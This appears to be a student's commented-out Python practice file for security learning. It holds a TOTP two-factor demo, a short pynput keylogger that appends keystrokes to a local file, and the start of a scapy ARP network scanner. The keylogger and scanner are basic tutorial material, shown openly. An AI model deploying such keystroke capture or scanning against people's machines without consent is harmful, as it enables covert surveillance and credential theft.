# """
# Author: uceewl4 uceewl4@ucl.ac.uk
# Date: 2024-03-07 15:59:44
# LastEditors: uceewl4 uceewl4@ucl.ac.uk
# LastEditTime: 2024-03-08 15:46:29
# FilePath: /security/tmp.py
# Description: 这是默认设置,请设置`customMade`, 打开koroFileHeader查看配置 进行设置: https://github.com/OBKoro1/koro1FileHeader/wiki/%E9%85%8D%E7%BD%AE
# """

# # """
# # Author: uceewl4 uceewl4@ucl.ac.uk
# # Date: 2024-03-07 15:59:44
# # LastEditors: uceewl4 uceewl4@ucl.ac.uk
# # LastEditTime: 2024-03-07 15:59:51
# # FilePath: /security/tmp.py
# # Description: 这是默认设置,请设置`customMade`, 打开koroFileHeader查看配置 进行设置: https://github.com/OBKoro1/koro1FileHeader/wiki/%E9%85%8D%E7%BD%AE
# # """

# # # 2FA in python
# # import time
# # import pyotp

# # key = (
# #     pyotp.random_base32()
# # )  # same key create same password, no one else can get the key
# # print(key)
# # # key = "mysuperkey" # can also generate manually
# # totp = pyotp.TOTP(key)
# # print(totp.now())  # time base for 30 seconds, after that it will exceeed

# # time.sleep(30)
# # print(totp.now)  # 30 seconds later, exceed

# # input_code = input("Enter your 2FA Code.")
# # print(totp.verify(input_code))  # verify whether the code is the same with the input one

# from pynput import keyboard


# def keyPressed(key):  # automatically passing in key (the info)
#     print(str(key))
#     # create the file and log the key input
#     # 'a' means appending
#     with open("keyfile.txt", "a") as logKey:
#         try:
#             char = key.char  # convert into char
#             logKey.write(char)
#         except:
#             print("Error getting char")


# if __name__ == "__main__":
#     listener = keyboard.Listener(
#         on_press=keyPressed
#     )  # everytime the key is pressed, passed information to keypressed function
#     listener.start()
#     input("please ")


#!/usr/bin/env python3
# Import scapy
# import scapy.all as scapy

# # We need to create regular expressions to ensure that the input is correctly formatted.
# import re

# # Basic user interface header
# print(
#     r"""______            _     _  ______                 _           _
# |  _  \          (_)   | | | ___ \               | |         | |
# | | | |__ ___   ___  __| | | |_/ / ___  _ __ ___ | |__   __ _| |
# | | | / _` \ \ / / |/ _` | | ___ \/ _ \| '_ ` _ \| '_ \ / _` | |
# | |/ / (_| |\ V /| | (_| | | |_/ / (_) | | | | | | |_) | (_| | |
# |___/ \__,_| \_/ |_|\__,_| \____/ \___/|_| |_| |_|_.__/ \__,_|_|"""
# )
# print("\n****************************************************************")
# print("\n* Copyright of David Bombal, 2021                              *")
# print("\n* https://www.davidbombal.com                                  *")
# print("\n* https://www.youtube.com/davidbombal                          *")
# print("\n****************************************************************")

# # Regular Expression Pattern to recognise IPv4 addresses.
# ip_add_range_pattern = re.compile("^(?:[0-9]{1,3}\.){3}[0-9]{1,3}/[0-9]*$")

# # Get the address range to ARP
# while True:
#     ip_add_range_entered = input(
#         "\nPlease enter the ip address and range that you want to send the ARP request to (ex 192.168.1.0/24): "
#     )
#     if ip_add_range_pattern.search(ip_add_range_entered):
#         print(f"{ip_add_range_entered} is a valid ip address range")
#         break


# # Try ARPing the ip address range supplied by the user.
# # The arping() method in scapy creates a pakcet with an ARP message
# # and sends it to the broadcast mac address ff:ff:ff:ff:ff:ff.
# # If a valid ip address range was supplied the program will return
# # the list of all results.
# arp_result = scapy.arping(ip_add_range_entered)
